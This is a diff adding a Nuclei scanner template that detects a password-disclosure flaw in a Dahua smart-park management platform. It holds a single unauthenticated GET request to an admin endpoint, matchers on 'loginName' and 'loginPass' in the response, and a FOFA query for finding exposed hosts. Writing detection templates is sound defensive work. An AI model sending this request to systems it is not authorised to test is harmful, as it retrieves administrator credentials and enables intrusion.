@@ -1,0 +1,28 @@
+id: dahua-passowrd-disclosure
+
+info:
+  name: Dahua - Info Disclosure
+  author: Co5mos
+  severity: critical
+  metadata:
+    max-request: 1
+    fofa-query: app="dahua-智慧园区综合管理平台"
+  tags: exposure,dahua
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/user_getUserInfoByUserName.action?userName=system"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "loginName"
+          - "loginPass"
+        condition: and
+
+      - type: status
+        status:
+          - 200
